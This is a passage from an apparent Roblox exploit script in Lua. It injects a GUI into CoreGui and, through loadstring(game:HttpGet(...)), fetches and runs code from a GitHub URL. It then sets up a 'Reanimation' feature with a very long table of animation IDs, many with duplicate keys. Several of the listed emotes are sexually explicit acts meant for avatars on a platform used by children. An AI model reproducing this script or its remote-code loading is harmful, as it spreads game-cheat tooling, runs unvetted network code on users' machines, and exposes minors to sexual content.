	for i=1,9 do
		local EmoteButton = Instance.new("Frame")
		EmoteButton.LayoutOrder = 2147483647
		EmoteButton.Name = "filler"
		EmoteButton.BackgroundTransparency = 1
		EmoteButton.BorderSizePixel = 0
		Ratio:Clone().Parent = EmoteButton
		EmoteButton.Visible = true
		EmoteButton.Parent = Frame
		EmoteButton.MouseEnter:Connect(function()
			EmoteName.Text = "Emote"
		end)
	end
end
 
if LocalPlayer.Character then
	CharacterAdded(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(CharacterAdded)
 
local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;

Notify({
Description = "Papi";
Title = "Sucuk";
Duration = 5;
});

-- Wait before showing the main GUI
wait(5)
 
ScreenGui.Parent = CoreGui
   end,
})

local Button = ReanimTab:CreateButton({
   Name = "Reanimation",
   Callback = function()
       local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local HttpService = game:GetService("HttpService")
    local LocalPlayer = Players.LocalPlayer

    -- Ghost Variables
    local ghostEnabled = false
    local originalCharacter,
        ghostClone,
        originalCFrame,
        originalAnimateScript,
        updateConnection,
        ghostOriginalHipHeight
    local cloneSize = 1
    local cloneWidth = 1
    local ghostOriginalSizes = {}
    local ghostOriginalMotorCFrames = {}
    local bodyParts = {
        "Head",
        "UpperTorso",
        "LowerTorso",
        "LeftUpperArm",
        "LeftLowerArm",
        "LeftHand",
        "RightUpperArm",
        "RightLowerArm",
        "RightHand",
        "LeftUpperLeg",
        "LeftLowerLeg",
        "LeftFoot",
        "RightUpperLeg",
        "RightLowerLeg",
        "RightFoot"
    }

    -- Built-in animations (loaded from file if available)
    local BuiltInAnimationsR15 = {
   ["Eat Out Women Version"] = 93266105699491,
   ["On The Knees Eating"] = 136489055170632,
   ["Motorboat"] = 105429834681384,
   ["head"] = 118753756727960,
   ["Twerk"] = 111430089763089,
   ["On The Floor"] = 97412783228774,
   ["Wall Twerk"] = 114732399796230,
   ["On Fours Barking"] = 111717223020726,
   ["Lay Down Jerking"] = 85921017724556,
   ["Grind"] = 90477619868120,
   ["Grind PT2 (FREE EMOTE)"] = 118976801943366,
   ["No Guidance"] = 90351605973094,
   ["Throw it in a circle"] = 123845287065196,
   ["throw back shaking"] = 86553026843924,
   ["Lap Dance"] = 81821310826451,
   ["Lap Dance 2"] = 97254220152361,
   ["Legs Open Jerking (BLOCK AVA)"] = 81702481134623,
   ["Legs Open Jerking (SKINNY AVA)"] = 105974155330335,
   ["Twerk It"] = 75938052455983,
   ["jerk it (r15 ava)"] = 103594611118042,
   ["jerk it (thin ava)"] = 94191974765309,
   ["butt face"] = 116542988507071,
   ["suck it"] = 127068474258312,
   ["back shot"] = 122127471936510,
   ["scissor"] = 135771690782346,
   ["eat out w admin"] = 119100600038929,
   ["self head"] = 120041047044008,
   ["stand up back shot"] = 100103766562705,
   ["Fours Spread"] = 100728188356463,
   ["hump"] = 100116363199104,
   ["hoop"] = 86833624323558,
   ["KOBE"] = 122427309475543,
   ["gun r15"] = 86653018615245,
   ["snake walk r15"] = 102920636378014,
   ["snake spin"] = 106981796315454,
   ["snake walk thin"] = 139470175375598,
   ["pole (block avt)"] = 140649927161129,
   ["criss cross"] = 123918662785598,
   ["laying down Twerk"] = 93655114514942,
   ["Tank"] = 85570038565331,
   ["federal"] = 89991992566935,
   ["up and down"] = 71969964030904,
   ["butterfly"] = 87526200587724,
   ["push"] = 132748907622578,
   ["IDOL"] = 118654215644051,
   ["mozes shuffle"] = 137354638934751,
   ["im into you"] = 126874160142792,
   ["apple pen"] = 126874160142792,
   ["freestylin"] = 135612915992185,
   ["rat dance"] = 78114662261380,
   ["La Chona"] = 13344857664,
   ["El coco"] = 14427504382,
   ["sexy"] = 13489541042,
   ["cumbia"] = 17027401228,
   ["colol"] = 13338731182,
   ["sit chat"] = 14579554140,
   ["sequncia"] = 14829175930,
   ["pump it up"] = 8676909735,
   ["hips"] = 13479765134,
   ["El son 3"] = 12699762116,
   ["spike"] = 14852486808,
   ["Griddy"] = 8916572099,
   ["Sturdy"] = 137959340008695,
   ["Float"] = 12256726178,
   ["Last Forever"] = 8874201750,
   ["Ride It"] = 6863561770,
   ["Fan Dance"] = 12928948342,
   ["IDOL"] = 104706018817755,
   ["NTTL"] = 93580979672065,
   ["Fucking Running ð¥"] = 12712457641,
   ["Weird ass breakdancing"] = 7070158948,
   ["Bumblebee"] = 13834565433,
   ["Cash Dance"] = 7041113269,
   ["Electro Shuffle"] = 9116910876,
   ["APT"] = 84631084374226,
   ["Sigma Boy"] = 92757660068329,
   ["Mask Off"] = 77901877634801,
   ["Alibi"] = 122664034133915,
   ["Be Gone"] = 18552943923,
   ["Bim Bam Boom"] = 18552948159,
   ["Boogie Down"] = 18552972055,
   ["Dimensional"] = 140255515874482,
   ["Gangnam Style"] = 18553011864,
   ["Jubi Slide / Slick Back"] = 107444119659023,
   ["Macarena"] = 18553106741,
   ["Slim Shady"] = 18553150120,
   ["Backflip"] = 18550514533,
   ["McDonalds at 3am in the morning ð¤¯"] = 7248304620,
   ["roll and rock"] = 11056185537,
   ["laid back shuffle"] = 8791067671,
   ["deposits"] = 7585369035,
   ["smooth winner"] = 7573570614,
   ["sway around"] = 11641870089,
   ["all night"] = 12201164828,
   ["hana"] = 11605072407,
   ["phon hon"] = 7350048609,
   ["poppy love (Automotivo Xm, Taka Taka Taka TÃ¡)"] = 16114220538,
   ["moster mash (judas)"] = 11537307923,
   ["shift (Government Hooker)"] = 11537224630,
   ["sturdyV2 (Love Me, Hate Me k3lah)"] = 11664843153,
   ["lia kim (In For It (XODDIAC Remix))"] = 8111230734,
   ["get started (ÐÐµÑÐ¾)"] = 10734797398,
   ["phonk music fr"] = 7232575007,
   ["Cold Out"] = 90779822053049,
   ["Did it first"] = 104924566284253,
   ["Keep Up"] = 80586234339889,
   ["Embrace It"] = 72117290471362,
   ["Wannabe space girls smooth"] = 14837825883,
   ["Pump it"] = 13842488942,
   ["Toca Toca"] = 14455340647,
   ["Toca Toca V2"] = 12916840571,
   ["Dancin"] = 9716509653,
   ["Paint The Town Red"] = 14901879394,
   ["Say So"] = 14034144806,
   ["Shake it off"] = 18952701833,
   ["Snoop's walk"] = 132477655284495,
   ["Social Climber"] = 16827106432,
   ["Starship ( nicki minaj )"] = 17598989892,
   ["Starlift"] = 18532446643,
   ["Stay"] = 12792347172,
   ["Stuck ( Cardi B )"] = 17450628542,
   ["Thank you next!"] = 13772961479,
   ["That's what i like ( Bruno Mars )"] = 13025071715,
   ["Toothless dance"] = 16214133435,
   ["Umbrella"] = 17566237110,
   ["Work remix ( A2AP Ferg )"] = 17569379378,
   ["YMCA"] = 13460810829,
   ["Coffin"] = 124985182093256,
   ["Call me maybe!"] = 15712992592,
   ["Diva"] = 15635063518,
   ["Gasolina"] = 15052732044,
   ["Talk Dirty"] = 14840663266,
   ["Thriller"] = 15208297905,
   ["Yo Bunny"] = 18655830398,
   ["Woman ( Doja )"] = 14845112417,
   ["Waka Waka"] = 13431512360,
   ["Waka Waka V2"] = 15381915476,
   ["Waiting for love"] = 72053710295476,
   ["Untouchable"] = 17570890409,
   ["Thrift Shop"] = 16753653616,
   ["Timber ( Nightcore )"] = 95495006115572,
   ["Texas Hold ' Em"] = 16625502258,
   ["Swag Beat"] = 115733505136871,
   ["Swalla"] = 18740808703,
   ["Summer"] = 13270529922,
   ["Stay Up"] = 124500473772133,
   ["SpongeBob  ( Jersey club )"] = 10980542151,
   ["Smack Yo"] = 131474670923668,
   ["Smack Yo V2"] = 137990521192304,
   ["Smooth Criminal"] = 13772963837,
   ["Smooth Criminal V2"] = 18402405089,
   ["Simpa"] = 12257423587,
   ["Simpa V2"] = 12453892230,
   ["Skidibi"] = 16756613065,
   ["Skidibi  V2"] = 16757369666,
   ["Shimmer ( fortnite )"] = 16395739858,
   ["Shape of you"] = 12626260779,
   ["Say it Right"] = 14044620822,
   ["Slay Phonk"] = 17353600859,
   ["Rude Boy"] = 13539279783,
   ["Rude Boy V2"] = 16827397883,
   ["Rockstar ( Push Up )"] = 14214317091,
   ["Heel Click Breakdown"] = 18441999758,
   ["teach me how to dougie"] = 7619764422,
   ["out west"] = 18553123644,
   ["Ishowspeed shake dat ass"] = 16455715993,
   ["russian kick (kalinka)"] = 8749319208,
   ["Caramelldansen"] = 110926505486019,
   ["Hot Springs"] = 72570494324774,
   ["Kazotsky Kick"] = 101318053989317,
   ["Slide"] = 119492771813670,
   ["Billie Jean"] = 12764845252,
   ["Blinding Lights"] = 16615772082,
   ["Box Swing"] = 140473666560735,
   ["Breakdance2005"] = 13806018931,
   ["Crank That"] = 9337916456,
   ["Criss Cross"] = 5806077631,
   ["Criss-Cross Toprock"] = 15767639861,
   ["Up Town Funk You Up"] = 10565486365,
   ["Dr. Livesey Walk"] = 71071097427597,
   ["Drip"] = 9836086127,
   ["Entranced"] = 123356412429416,
   ["Fly Dance (Rather Be)"] = 9730153158,
   ["Friday Night"] = 8723336030,
   ["Funky Jig"] = 10909214966,
   ["Gangnam Style"] = 16883073608,
   ["Get Sturdy"] = 12126389709,
   ["Groovy"] = 8208076144,
   ["Holiday"] = 119715551234716,
   ["Insanity"] = 8575452869,
   ["Legal Reasons (PewDiePie T-Series Disstrack)"] = 16513267930,
   ["Newtron Boogie"] = 111093010610650,
   ["Pop And Lock (TikTok - Kesha)"] = 8083855559,
   ["Reflex"] = 8580057295,
   ["Riding It"] = 8038132892,
   ["Rodeo"] = 9292118892,
   ["Sit"] = 4842017973,
   ["The Flop"] = 16513281388,
   ["Thriller"] = 4699820365,
   ["Tootsee Roll"] = 12986187501,
   ["Toprocking"] = 12986187501,
   ["Wednesday"] = 18903731826,
   ["ah yes"] = 3383725246,
   ["Explode"] = 18517277884,
   ["smeeze"] = 18553199244,
   ["to the beat"] = 18553190141,
   ["conga 1"] = 79002139027906,
   ["conga 2"] = 91965031391808,
   ["starlit"] = 18532446643,
   ["surfin' Bird (Peter griffin dance)"] = 130091927678906,
   ["Push ups"] = 16069644453,
   ["punching"] = 16069488698,
   ["Marsh walk"] = 7514926048,
   ["Ashi Ashi"] = 16388690075,
   ["Popular (The Weeknd)"] = 15643535842,
   ["alors on danse"] = 9331423748,
   ["California Girls"] = 125389830710791,
   ["glyphic"] = 14846105925,
   ["go just go"] = 13990340012,
   ["goated"] = 18969257806,
   ["shower"] = 16119477663,
   ["wednesday"] = 18766885785,
   ["walking on a dream"] = 11771777726,
   ["water"] = 15182917055,
   ["wavy"] = 11528196432,
   ["gta dance"] = 18743035691,
   ["giri giri"] = 18655870449,
   ["hakari dance"] = 18846734933,
   ["just dance"] = 11456890837,
   ["shuffle"] = 15783246823,
   ["the dance laroi"] = 75239905741750,
   ["cupid"] = 14458761918,
   ["not my problem"] = 102637131613028,
   ["blurred lines"] = 11682931919,
   ["renai circulation"] = 14881809061,
   ["trance"] = 13461610584,
   ["bibi fogosa"] = 18946055933,
   ["rollie"] = 12386799815,
   ["miss the rage"] = 109658630298836,
   ["fresh"] = 9116897929,
   ["rambunctious"] = 6955675746,
   ["billy bounce"] = 8917592832,
   ["electro swing"] = 7839963379,
   ["jabbaswitchaway"] = 8229514367,
   ["mufasa"] = 8459864580,
   ["tidy"] = 6657942302,
   ["floss"] = 9003921069,
   ["bye bye bye"] = 74459902656965,
   ["jaywalkin"] = 10970927618,
   ["worm"] = 7160307855,
   ["lazer blast"] = 9634449536,
   ["spiderman"] = 8228461600,
   ["flippin sexy"] = 7144733185,
   ["bust a move"] = 15120502730,
   ["surf bird"] = 15576917846,
   ["orange justice"] = 11212163754,
   ["scenario"] = 8924083749,
   ["boppin"] = 13579968035,
   ["bouncin"] = 18986228959,
   ["peanutbutter jelly time"] = 10049457548,
   ["stock shuffle 2"] = 15039780593,
   ["hugo"] = 18502971000,
   ["expresso"] = 115573948686907,
   ["back on 74 static loop"] = 16928174772,
   ["barbi"] = 14340896214,
   ["ET"] = 17302883077,
   ["moongazer cafune"] = 135064031952812,
   ["Laufey from the start"] = 85444981015452,
   ["bubble gum 1 new jeans"] = 18331822907,
   ["bubble gum 2 new jeans"] = 18331893728,
   ["september - earth wind and fire"] = 15086356834,
   ["super shy pt 1"] = 18331640591,
   ["super shy pt2"] = 18331705911,
   ["alibi pt1"] = 18125236590,
   ["alibi pt2"] = 18319544101,
   ["alibi pt 3"] = 18639586999,
   ["beat it mj"] = 13842485756,
   ["peanut butter jelly time"] = 5803901179,
   ["Dice"] = 14846465116,
   ["Agassy"] = 15569359960,
   ["Wa Da Da"] = 17590216758,
   ["Samsara"] = 17483159067,
   ["fundy jig"] = 10724859471,
   ["chikiri bai bai"] = 140291985636707,
   ["Sugar Rush Ride"] = 16817943406,
   ["Vapu Vapu"] = 16995605441,
   ["Simpa V2"] = 12453892230,
   ["scenario"] = 8924083749,
   ["Bhangra Boogie"] = 108017084992975,
   ["Raining Tacos"] = 18996306719,
   ["Kaito Is An Alien"] = 18829447419,
   ["Sheesh"] = 16987826572,
   ["Tra Tra"] = 18231426297,
   ["Americano"] = 8601286610,
   ["Shoot!"] = 15954541522,
   ["YooHoo"] = 15795602834,
   ["Sickick Mind Games"] = 115672975245116,
   ["bubble gum 1 new jeans"] = 18331822907,
   ["Silent Hacker"] = 16826813658,
   ["Round 6"] = 86785215843177,
   ["NA"] = 131666011040524,
   ["goofy goober"] = 73981202280803,
   ["Drop It Like It's Hot"] = 15178362342,
   ["Hush Rush"] = 17743368730,
   ["GGUM"] = 131137139811722,
   ["Killing Me"] = 15926567988,
   ["Horizon"] = 16906389402,
   ["Endless Flow"] = 99816916718811,
   ["Typa Girl"] = 15786367515,
   ["Slide Now Now"] = 8230248004,
   ["bumble bee"] = 13964477190,
   ["Springy"] = 133890078327190,
   ["hug me more"] = 7042423417,
   ["Moongazer"] = 135064031952812,
   ["Hope"] = 15511861196,
   ["Starship ( nicki minaj )"] = 17598989892,
   ["Puppet Show"] = 15437172661,
   ["The Girls II"] = 14950069955,
   ["More & More"] = 15957779312,
   ["POP!"] = 15954524008,
   ["Macarena"] = 8917320260,
   ["Money trees"] = 14458875200,
   ["BrooklynBloodPop!"] = 15309391511,
   ["Kitty Cat MEME"] = 18121561293,
   ["Boney Bounce"] = 83470324180522,
   ["Hate Rodrigo"] = 14758497233,
   ["Planetary"] = 109054885000137,
   ["Tyla Dance"] = 18218681238,
   ["Poker Face II"] = 18710870010,
   ["oddloop"] = 18715249701,
   ["Funk do bounce"] = 132545638708993,
   ["Cash Dance"] = 7041113269,
   ["The Dogg"] = 108340529144175,
   ["Stranger"] = 16121568289,
   ["Loco"] = 14950828704,
   ["Cuff It ( Beyonce )"] = 11115365773,
   ["WiggleWiggle"] = 17439999314,
   ["calm down"] = 88277560473596,
   ["Make A Wish"] = 9355351062,
   ["Shawn Stitches"] = 130634896001082,
   ["5sec Youngblood"] = 109971524835248,
   ["I'm Bad"] = 18766790249,
   ["Money"] = 15088152079,
   ["Poppin' Shakin'"] = 17171828067,
   ["maria hwasa"] = 15489358017,
   ["Brooklyn pop"] = 17244348290,
   ["Go Mufasa (Fortnite)"] = 134887103409831,
   ["Not A Devil"] = 125983101461360,
   ["crank that"] = 7974313986,
   ["Bang"] = 15879246434,
   ["workit"] = 9395049509,
   ["Shut Down"] = 16817391887,
   ["How That Taste"] = 18651813895,
   ["Drive Me Crazy"] = 17353959998,
   ["Magnetic"] = 17078018782,
   ["Slum Anthem II"] = 17744858894,
   ["Shout"] = 16906627656,
   ["All Night"] = 16491251704,
   ["Heart 111"] = 18399954129,
   ["How You Like That II"] = 14204478463,
   ["I Am"] = 14758520223,
   ["Exclusive"] = 17068780580,
   ["LALISA"] = 15101980014,
   ["Mesmerizer (Miku) (TT Ver.)"] = 17640486421,
   ["Oh Shhh"] = 137052510169731,
   ["jerk off"] = 85510928563896,
   ["entranced"] = 18442013842,
   ["To The Moon"] = 94655045117804,
   ["Feelin' Jaunty"] = 136570900168732,
   ["Fast Feet"] = 80217482934917,
   ["LOVE AGAIN (The Kid LAROI)"] = 89422288168329,
   ["Go Mufasa"] = 134887103409831,
   ["In Da Party"] = 81251164590970,
   ["I Like To Move It"] = 127449912339458,
   ["I'm Out"] = 112938518545551,
   ["Wanna See Me"] = 132796690293567,
   ["The Dip"] = 129512349496854,
   ["Toosie Slide"] = 135788271145619,
   ["Barbi"] = 14340896214,
   ["Let It Out"] = 11822727177,
   ["Brooklyn Pop"] = 8763979029,
   ["hustla"] = 139569192211929,
   ["fishin (Fortnite)"] = 7305746986,
   ["ride the pony (Fortnite)"] = 9848532804,
   ["get Sturdier"] = 137959340008695,
   ["SturdyV2"] = 137959340008695,
   ["Gangnam V2"] = 8913898338,
   ["Jabba Loop V2"] = 8229514367,
   ["Love Me Like I Love You"] = 113197266804415,
   ["Smooth Criminal"] = 8036951540,
   ["The Worm Loop V2"] = 7160307855,
   ["Rude Boy II"] = 16827397883,
   ["Scream & Shout II"] = 16827533892,
   ["Slave To The Rhythm"] = 16827642962,
   ["Clothes"] = 16827238817,
   ["Bad Remix"] = 16906283522,
   ["HeavyDirtySoul"] = 16927471657,
   ["Heroes Tonight"] = 16927556629,
   ["Igaku"] = 16922809079,
   ["Runaway"] = 16927669445,
   ["Prince Of Egypt"] = 16906415457,
   ["Marikit Sa Dilim"] = 16906666026,
   ["Cure For Me"] = 16995704851,
   ["Having a Bath"] = 16995463809,
   ["Lay It Down II"] = 16986250768,
   ["Long Way 2 Go"] = 16989628401,
   ["No Doubt"] = 16988711502,
   ["Pajama Party Song"] = 16997154126,
   ["Stupid In Love"] = 16995583000,
   ["The Way I Are"] = 16987792033,
   ["Truth or Dare"] = 16988291254,
   ["Automotivo Satisfaction"] = 16986465327,
   ["ENOUGH!"] = 17102029049,
   ["Markiplier"] = 17101949137,
   ["Midnight Morning"] = 17080363745,
   ["Rabbit Hole"] = 17080368789,
   ["Take It"] = 17068852940,
   ["Tenge Tenge"] = 17069865343,
   ["Bad Boy"] = 15959913476,
   ["Have You Seen My Bf"] = 17519408697,
   ["Hit Me Up"] = 17514363987,
   ["I Win, You Lose"] = 17509887742,
   ["It's Gonna Be Me"] = 17505818113,
   ["Jelebi Baby"] = 17510005422,
   ["Bass Knight"] = 18236720385,
   ["SequÃªncia ColocadÃ£o"] = 17512666760,
   ["Sheâs From The Island"] = 17494079141,
   ["Without Me"] = 1750587209,
   ["Better When I'm Dancin'"] = 17598991805,
   ["Carefree"] = 17589995043,
   ["Dancing With A Stranger"] = 17598086026,
   ["Don't Talk To Me"] = 17598993954,
   ["Good Night Lady"] = 17589330422,
   ["Hammer Time"] = 17589891310,
   ["Melbourne Shuffle"] = 17588925114,
   ["SWAG"] = 17741857313,
   ["Shake That Brass"] = 17591333595,
   ["The Posh Boy"] = 17591075030,
   ["Uptown Funk"] = 17669452796,
   ["Tacaca"] = 17669244192,
   ["Hey Ho"] = 17669297584,
   ["Gigantic O.T.N"] = 17509790527,
   ["Eu Sento Gabu!"] = 17658071387,
   ["I Like It"] = 17672349928,
   ["Con Con Cat"] = 17742298800,
   ["Dance therapy"] = 17753378250,
   ["Don't Worry"] = 17744212701,
   ["Let Me See You"] = 17744917114,
   ["Low"] = 17755523209,
   ["Luz Do Luar"] = 17743420847,
   ["Made In Romania"] = 17759349644,
   ["Mysterious Game"] = 17742094115,
   ["Oka Ramman"] = 17753542254,
   ["Buss It"] = 17745190428,
   ["BELLAKEO"] = 17837503282,
   ["Beautiful Liar"] = 17831045411,
   ["Bloodline"] = 17832109114,
   ["DominÃ³"] = 17842534573,
   ["Get Into It (Yuh) II"] = 17833304354,
   ["I Luv It"] = 17832763915,
   ["Incredible"] = 17835044374,
   ["PR FERIR"] = 17843957556,
   ["Worth It II"] = 17831097892,
   ["You Right"] = 17831711725,
   ["Ain't Your Mama"] = 17830768930,
   ["Ai Ai Ai Mega Prince"] = 18125672887,
   ["Ai He"] = 18121645911,
   ["Alibi II"] = 18319544101,
   ["Chihiro MTG"] = 18148386362,
   ["Double Team"] = 18125445041,
   ["Espresso"] = 18146564147,
   ["Espresso II"] = 18135222680,
   ["Gangsta"] = 18133641617,
   ["Helltaker"] = 18121692753,
   ["JumpStyle"] = 17858431097,
   ["Let's Do It Again"] = 18121579426,
   ["Nasty"] = 18148041233,
   ["Ui Mugibatake"] = 18147252039,
   ["Baby II"] = 18209522583,
   ["Baseline Bussiness"] = 18207659656,
   ["Bouncing G5"] = 18210900028,
   ["Ding Dong Song"] = 18246278810,
   ["I I I"] = 18232085181,
   ["La Pepo"] = 18219213495,
   ["MTG Last Night"] = 18218852741,
   ["Safer"] = 18218538613,
   ["Pumba Pumba"] = 18348715399,
   ["WISE"] = 18238999192,
   ["Company Jig"] = 18319231655,
   ["Diamonds & Pearls"] = 18348287674,
   ["Don't Go Insane"] = 18336940634,
   ["El gatito tuyo te perdio"] = 18347159703,
   ["Gucci Gucci"] = 18318203808,
   ["Pantropiko x Day & Night"] = 18332625539,
   ["Darling"] = 18432613302,
   ["De Yang Gatal Sa"] = 18443267622,
   ["Goodies"] = 134586304179871,
   ["La Mama"] = 18445553677,
   ["Like A Rodeo"] = 18447913072,
   ["Qinghai Shake"] = 18443420661,
   ["Tiramisu Cake"] = 18400161233,
   ["Tuca Tuca"] = 18443210308,
   ["5:20AM"] = 18441535557,
   ["9mm"] = 18319003563,
   ["Confident"] = 18443885876,
   ["Da Da Da II"] = 18546573714,
   ["Da Da Da Shuffle"] = 18546537798,
   ["Dancin' Domino"] = 18522791385,
   ["No Speak Americano"] = 18536691886,
   ["Point and Strut"] = 18532500355,
   ["Samba De Wasshoi!"] = 18532929480,
   ["The Squabble"] = 18553745388,
   ["Tucked"] = 18530609511,
   ["Dung Lam Trai"] = 18649048765,
   ["Giri Giri Dance"] = 18655870449,
   ["I Wanna Be Your follower"] = 18641984949,
   ["Meet at the next corner"] = 18648818158,
   ["Meme Funk"] = 18642062621,
   ["PAKU"] = 18648976965,
   ["Tell me"] = 18766916309,
   ["Back On 74"] = 18740645336,
   ["Been Like This"] = 18740994665,
   ["Dadadada Tenshi"] = 18710950115,
   ["GTA Dance"] = 18743035691,
   ["I Have Nothing To Say"] = 18725268714,
   ["Koi Dance"] = 18723607032,
   ["Lost In Paradise"] = 18724677202,
   ["Love Kyun Wanted"] = 18711007163,
   ["Mine"] = 124492610127985,
   ["Motteke Sailor Fuku"] = 18723463754,
   ["A Bar Song"] = 103000564408232,
   ["Rockabye"] = 18724951218,
   ["Swalla"] = 18740808703,
   ["Back It Up"] = 18846379978,
   ["Bye Bye Bye"] = 18836343559,
   ["FUNKED UP"] = 18863712729,
   ["Fine China"] = 18820121203,
   ["Gyatt For Nerizzler"] = 18845819589,
   ["HA-HA!"] = 18846103241,
   ["Hakari Dance"] = 18846734933,
   ["Heel Click"] = 18863706004,
   ["Japanese Phonk"] = 18862724630,
   ["Korean Cheerleader"] = 18829377057,
   ["Kuru Kuru Kururin"] = 18848216027,
   ["Ma Ma Ma II"] = 18846154606,
   ["Neko Kaburi Na"] = 18835807145,
   ["Sacabambaspis"] = 18834774168,
   ["Anima Power"] = 18959257871,
   ["Brites Moves"] = 18950197254,
   ["Evil Plan"] = 18863717493,
   ["Goated"] = 18969257806,
   ["Leaderboard"] = 137150638313235,
   ["Lunar Party"] = 119703033043179,
   ["Rollie"] = 139528127590899,
   ["Stay Up"] = 124500473772133,
   ["Swag Beat"] = 115733505136871,
   ["Tauba Tauba"] = 116578687414020,
   ["Timber1"] = 95495006115572,
   ["Bird Call"] = 116815789865803,
   ["Speed"] = 92687809152911,
   ["Big Dawgs"] = 84090608993841,
   ["Boing Swing"] = 83700935018360,
   ["Can Can"] = 123220715631267,
   ["Fast Flex"] = 110332761819297,
   ["Feel It"] = 131709887164498,
   ["Lo-fi"] = 96519329274556,
   ["Pulsebreaker"] = 129276303376319,
   ["Snake Groove"] = 92227709240709,
   ["Walkin' Pretty"] = 114254689551646,
   ["Without You"] = 77766747777549,
   ["After Hours"] = 105935327122803,
   ["Criss Cross"] = 83451553426933,
   ["Miley"] = 71785961342293,
   ["Hana"] = 86261625089100,
   ["Happy Dog"] = 110780464467650,
   ["His & Hers"] = 109871383329975,
   ["Jaywalking"] = 125238941692427,
   ["Shaq"] = 116805820449516,
   ["Smack Yo"] = 131474670923668,
   ["Spicy Start"] = 122507653814221,
   ["Theme song"] = 103889663436383,
   ["Alibi III"] = 18639586999,
   ["Philly Goats-Buckle Up"] = 91495711099103,
   ["ASmith-Dancin"] = 139782974681210,
   ["Blast Move"] = 80025649457203,
   ["Fast Fury"] = 130985777939088,
   ["Fierce Swag"] = 102877697069779,
   ["Gru Dance"] = 121765148647875,
   ["Maximum Bounce"] = 74084616150320,
   ["Night Out"] = 93771723828849,
   ["Smooth Slide"] = 89487756791952,
   ["Cheerleader2"] = 71252630434744,
   ["Doodle"] = 84463413551540,
   ["Leilt"] = 125395879083009,
   ["Malatanghulu2"] = 106868003915523,
   ["Slide Stride"] = 140603204775430,
   ["Sweet Shot"] = 133379233738041,
   ["APTv2"] = 133395265727090,
   ["Mamushi"] = 18845906101,
   ["Culture Festival"] = 132419238573831,
   ["Emergency2"] = 130675735022329,
   ["Mood"] = 98228401832445,
   ["PC24"] = 87214454379601,
   ["Pig Dance"] = 138988330656366,
   ["john-Traffic"] = 71894922167975,
   ["h3R3-MissYou"] = 133109803473958,
   ["Amaarae-Luv Money"] = 122157693129395,
   ["Hiiragi-Tetoris"] = 125058040803530,
   ["Batte Forte"] = 102060121134651,
   ["Ask Me"] = 135228282276469,
   ["Halloween Beast"] = 12540868623,
   ["I Ain't Afraid"] = 81315214408244,
   ["Monster Mash"] = 75657221755215,
   ["Pump It Up"] = 107556241253371,
   ["Reanimated1"] = 98469545127257,
   ["Fright Funk1"] = 83544638023597,
   ["Hot To Go"] = 85267023718407,
   ["Bad Guy1"] = 77288355613525,
   ["Carolina"] = 78673618409072,
   ["Debochada"] = 76463210365083,
   ["Dream Feet"] = 72705907144448,
   ["Lazer Blast"] = 107994227175066,
   ["MAITAKE"] = 93130440754306,
   ["Moonlit"] = 81834617503414,
   ["Gangnam"] = 80398743560629,
   ["Granada"] = 78293994761172,
   ["Arona"] = 116975656514108,
   ["Pop In 2"] = 123702667366431,
   ["Run"] = 91085526067649,
   ["Shiitake"] = 129227624624368,
   ["Snoop Walk"] = 132477655284495,
   ["Take it Slow"] = 100551198874005,
   ["smaSher-Empurra"] = 137091690757651,
   ["Veggie"] = 132295464457565,
   ["Chaos"] = 72779334811742,
   ["Bunny Girl"] = 135330413860391,
   ["NINA-Move Ya Body"] = 109551168484965,
   ["Desirable"] = 108818394598530,
   ["FAERIE"] = 127885017128720,
   ["Make Me"] = 140183892184019,
   ["Kashii-Cat Loving"] = 126746495297624,
   ["Blanktape-Turuan"] = 132716888916327,
   ["BrunoM-Bonde"] = 82716852623277,
   ["DJHard-Bashi Bashi"] = 115798738289130,
   ["GDRAGON-POWER"] = 83561852796756,
   ["JJ Lin-No Money"] = 99637974405359,
   ["CharlieP-Dont Talk"] = 94461583739254,
   ["Oruam-TROPA DO ORUAM"] = 107591803417714,
   ["Zachz-guli"] = 71078330743706,
   ["El Alfa-ESTE"] = 138723007840035,
   ["HEARTSTEEL-Paranoia"] = 136926335172781,
   ["Lojay-Monalisa"] = 109905892550009,
   ["SoMo-50Feet"] = 115380505264488,
   ["TruththeBull-HYPE ME UP"] = 139400505174036,
   ["Village People-YMCA"] = 78742010701451,
   ["BB Belt"] = 79541061032796,
   ["YOASOBI-UNDEAD"] = 109658950870605,
   ["Something Sweet"] = 117011995366745,
   ["Rich-Tapout"] = 102480130402269,
   ["NiziU-Make Happy"] = 107018845763813,
   ["BUMBAA"] = 90779822053049,
   ["Bed Chem"] = 70614062353518,
   ["Did It First"] = 104924566284253,
   ["Nomi-BLAH"] = 76529954844846,
   ["Problem2"] = 102637131613028,
   ["Embrace It"] = 72117290471362,
   ["KEEP UP"] = 80586234339889,
   ["Ariana-No Tears"] = 112734209857887,
   ["JT-SwagBack"] = 95939066860595,
   ["Happy (Prod. Hedyy)"] = 18953456970,
   ["Last Forever"] = 18863701920,
   ["Looking Good"] = 18863697075,
   ["See Me In A Crown"] = 18973179163,
   ["Shake It Off"] = 18952701833,
   ["Soltando PancadÃ£o"] = 18972490730,
   ["Suki Suki Suki"] = 18946025428,
   ["SÃ£o Amores"] = 18952949480,
   ["Uchida 1"] = 18945973328,
   ["Your Number"] = 18953075358,
   ["Apple Dance 2"] = 18946844622,
   ["As Long As You Huat"] = 18998207468,
   ["Bag Work"] = 123725130872798,
   ["ArianaG-Last Christmas"] = 130115633688469,
   ["Champ's Clap"] = 18995451918,
   ["Element"] = 18995977824,
   ["Independence"] = 19003847439,
   ["Lights Out"] = 18998437001,
   ["Oki Doki"] = 18993544375,
   ["Splash Damage"] = 18995334538,
   ["Ta Ta Ta"] = 75826066577908,
   ["Dancery"] = 139819388139667,
   ["MariahC-Want 4 xmas"] = 15569415780,
   ["Fantasy Faceoff"] = 136282125273244,
   ["Jiggle Jiggle"] = 103720979881624,
   ["Jumpshot"] = 98925895870667,
   ["Baby Mama"] = 99110766306643,
   ["Outlaw"] = 82746341617847,
   ["Ta Ta Ta 2"] = 91368017589759,
   ["Handshake"] = 71243990877913,
   ["Stay Style"] = 93328147373779,
   ["Challenge"] = 83923307400471,
   ["Classy"] = 78428472180235,
   ["Don't Cha"] = 98588383635359,
   ["Forget Me Not"] = 119574283368193,
   ["Jubi Slide"] = 98252061243403,
